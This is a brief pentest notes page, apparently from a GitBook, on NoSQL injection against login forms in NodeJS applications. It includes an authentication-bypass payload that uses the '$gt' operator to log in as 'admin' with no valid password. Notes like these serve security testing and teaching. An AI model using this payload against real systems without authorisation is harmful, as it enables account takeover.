# Users - Passwords

## Users - Passwords

### Simple POC

* NodeJS has a QS module that has specific syntax to convert HTTP request params into JSON objects :
* Login request :

![](../../../../.gitbook/assets/8a3da914cf9f4c69a3442551fb58117f.png)

* Edit the POST request :

![](../../../../.gitbook/assets/ceb4e991f80444648dcdd9be50329253.png)

### Simple POC \#2

* Classic login form :

![](../../../../.gitbook/assets/108e4d1feed446c6bd44fefbef489fc9.png)

* Injection :

![](../../../../.gitbook/assets/cebbea66137b437787c3e3393e2f8776.png)

```text
{"$gt":""}

{"username":"admin","password":{"$gt":""}}
```

